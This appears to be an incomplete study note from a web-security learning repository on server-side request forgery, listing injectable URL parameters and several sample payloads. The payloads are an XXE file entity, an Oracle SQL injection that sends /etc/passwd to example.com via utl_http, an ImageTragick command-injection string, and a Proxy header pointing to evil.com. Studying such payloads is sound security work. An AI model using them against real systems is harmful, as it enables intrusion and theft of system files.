# SSRF
Server Side Request Forge  
Bypass the firewall and grope through the intranet  

![ssrf](https://github.com/shinmao/Web-Security-Learning/blob/master/SSRF/screenshot/SSRF.png)  
Find the vulnerable place > with Protocol > Apply to deeper attack > Bypass

# Find the vulnerable place
**Controllable** URL parameter：url, src, imgURL, share, wap, link  
share the content via URL  
translate the context with online translator  
load the pic with URL  
some api  
1. XXE(You can directly see in my XXE part)  
```php
<!ENTITY % file SYSTEM "file://url/xxx">
```
  
2. `file_get_contents($url)`(PHP)  
```php
$image = file_get_contents('http://self-ip');
```
[Day 20 - Stocking](https://www.ripstech.com/php-security-calendar-2017/#day-20)  
  
3. curl(PHP)  
in fact, from `curl -V` we can see the libcurl support many protocols  
  
4. Oracle UTL_HTTP  
```php
?id=1'||CTXSYS.DRITHSX.SN(user,substr(utl_http.request('http://example.com?download=/etc/passwd'),1,160))||'
```  
  
5. ImageTragick  
```php
...
fill 'url(https://example.com/";|ls "-la)'
...
```  
[ImageTragick](https://imagetragick.com/)  
CVE-2016-3718  
POC on Facebook  

6. Header HTTP proxy  
According to CGI, headers in the request would be replaced with env variables  
e.g. Host -> $HTTP_HOST, Proxy -> $HTTP_Proxy  
This is the vul  
```php
GET
...
Proxy: http://evil.com/
```  
hijack the http connection


# with Protocol  
![](https://farm2.staticflickr.com/1774/43295065584_6cfa758570_m.jpg)  

# Apply to deeper attack

# Bypass  
Bypass DNS limit  
Bypass ip limit

## Reference
* Orange Slides
